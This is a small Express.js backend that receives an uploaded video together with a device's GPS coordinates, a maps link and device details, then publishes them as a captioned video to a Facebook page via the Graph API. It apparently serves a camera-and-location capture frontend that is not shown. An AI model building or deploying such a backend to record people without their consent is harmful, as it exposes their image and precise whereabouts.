import express from "express";
import multer from "multer";
import fetch from "node-fetch";
import FormData from "form-data";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const upload = multer();
const PORT = process.env.PORT || 3000;

const PAGE_ID = process.env.PAGE_ID;
const ACCESS_TOKEN = process.env.ACCESS_TOKEN;

// Upload video + metadata
app.post("/upload-video", upload.single("video"), async (req, res) => {
    try {
        const videoFile = req.file;
        if (!videoFile) return res.status(400).json({ error: "No video uploaded" });

        const { latitude, longitude, accuracy, maps, deviceInfo } = req.body;

        let description = "🎬 Successfully Recorded ✔\n";
        if (latitude && longitude) {
            description += `📍 Location: ${latitude}, ${longitude}\n`;
            description += `🌐 Google Maps: ${maps || "N/A"}\n`;
        }
        if (deviceInfo) description += `📱 Device Info: ${deviceInfo}\n`;

        const form = new FormData();
        form.append("source", videoFile.buffer, videoFile.originalname);
        form.append("description", description);
        form.append("access_token", ACCESS_TOKEN);

        const fbResponse = await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`, {
            method: "POST",
            body: form,
            headers: form.getHeaders()
        });

        const result = await fbResponse.json();
        console.log("Video posted:", result);
        res.json(result);

    } catch (err) {
        console.error("Server Error:", err);
        res.status(500).json({ error: err.message });
    }
});

// Serve frontend
app.use(express.static("frontend"));

app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
